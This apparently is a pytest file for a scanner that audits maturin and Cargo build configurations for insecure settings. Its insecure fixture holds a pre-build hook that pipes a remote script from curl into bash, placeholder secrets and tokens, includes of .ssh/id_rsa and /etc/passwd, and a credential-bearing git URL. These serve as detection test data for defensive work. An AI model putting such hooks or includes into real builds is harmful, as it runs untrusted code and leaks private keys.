"""Tests for MaturinAnalyzer."""

from pathlib import Path

from devai.maturin_analyzer import MaturinAnalyzer, MaturinFinding


INSECURE_PYPROJECT = """\
[build-system]
requires = ["maturin>=1.0,<2.0"]
build-backend = "maturin"

[project]
name = "insecure-rust-pkg"
version = "1.0.0"

[tool.maturin]
bindings = "cffi"
features = ["pyo3/extension-module"]
pre-build = "curl -s https://install.example.com/setup.sh | bash"
MATURIN_PASSWORD = "super-secret-password"
pypi-token = "pypi-AgEIcHlwaS5vcmcvY2k-EXAMPLETOKENEXAMPLETOKENEX"
skip-auditwheel = true
include = [".ssh/id_rsa", "/etc/passwd"]
"""

INSECURE_CARGO = """\
[package]
name = "insecure-rust-pkg"
version = "0.1.0"

[dependencies]
serde = { git = "https://user:pass@github.com/example/serde.git", branch = "main" }
reqwest = { version = "*", default-features = false }

[lib]
name = "insecure_rust_pkg"
crate-type = ["cdylib"]
"""

HARDENED_PYPROJECT = """\
[build-system]
requires = ["maturin>=1.0,<2.0"]
build-backend = "maturin"

[project]
name = "secure-rust-pkg"
version = "1.0.0"

[tool.maturin]
bindings = "pyo3"
features = ["pyo3/extension-module"]
module-name = "secure_rust_pkg._rust"
"""


class TestMaturinAnalyzer:
    def test_no_configs_returns_perfect_score(self, tmp_path: Path):
        (tmp_path / "app.py").write_text("x = 1\n", encoding="utf-8")
        analyzer = MaturinAnalyzer(str(tmp_path))
        assert analyzer.stats.configs == 0
        assert analyzer.health_score() == 100.0

    def test_ignores_non_maturin_pyproject(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(
            '[project]\nname = "plain"\nversion = "1.0.0"\n',
            encoding="utf-8",
        )
        analyzer = MaturinAnalyzer(str(tmp_path))
        assert analyzer.stats.configs == 0

    def test_detects_insecure_patterns(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(INSECURE_PYPROJECT, encoding="utf-8")
        analyzer = MaturinAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "curl_pipe_shell" in kinds
        assert "hardcoded_secret" in kinds or "pypi_token" in kinds
        assert "sensitive_path" in kinds
        assert "skip_auditwheel" in kinds
        assert "unsafe_bindings" in kinds
        assert analyzer.health_score() < 100.0

    def test_detects_cargo_with_maturin_pyproject(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(HARDENED_PYPROJECT, encoding="utf-8")
        (tmp_path / "Cargo.toml").write_text(INSECURE_CARGO, encoding="utf-8")
        analyzer = MaturinAnalyzer(str(tmp_path))
        paths = {p.name for p in analyzer.configs()}
        assert "pyproject.toml" in paths
        assert "Cargo.toml" in paths
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "scm_credentials" in kinds
        assert "unpinned_git_dep" in kinds

    def test_hardened_config_has_no_findings(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(HARDENED_PYPROJECT, encoding="utf-8")
        analyzer = MaturinAnalyzer(str(tmp_path))
        assert analyzer.health_score() == 100.0
        assert analyzer.stats.findings == 0

    def test_finding_format(self):
        finding = MaturinFinding(
            kind="pypi_token",
            severity="high",
            message="test message",
            path="pyproject.toml",
            lineno=10,
            line="token = secret",
        )
        assert "high" in finding.format()
        assert "pyproject.toml:10" in finding.format()

    def test_generate_hardened_config(self, tmp_path: Path):
        analyzer = MaturinAnalyzer(str(tmp_path))
        config = analyzer.generate_hardened_config()
        assert "[tool.maturin]" in config
        assert "pyo3" in config

    def test_summary_and_context(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(INSECURE_PYPROJECT, encoding="utf-8")
        analyzer = MaturinAnalyzer(str(tmp_path))
        assert "maturin configs:" in analyzer.summary()
        context = analyzer.to_context()
        assert "maturin analysis:" in context
        assert "health score:" in context
